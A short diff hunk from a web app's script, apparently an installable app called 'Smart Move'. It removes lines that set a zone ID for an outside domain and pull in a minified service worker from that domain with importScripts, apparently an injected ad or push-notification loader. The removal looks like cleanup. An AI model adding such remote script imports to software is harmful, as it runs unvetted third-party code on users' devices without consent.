@@ -7,12 +7,6 @@ if (installButton && isInstalled) {
   installButton.hidden = true;
   installHelp.textContent = "Smart Move is installed on this device.";
 }
-self.options = {
-    "domain": "5gvci.com",
-    "zoneId": 12178593
-}
-self.lary = ""
-importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
 
 if (navigator.serviceWorker && window.isSecureContext) {
   navigator.serviceWorker.register("./service-worker.js")
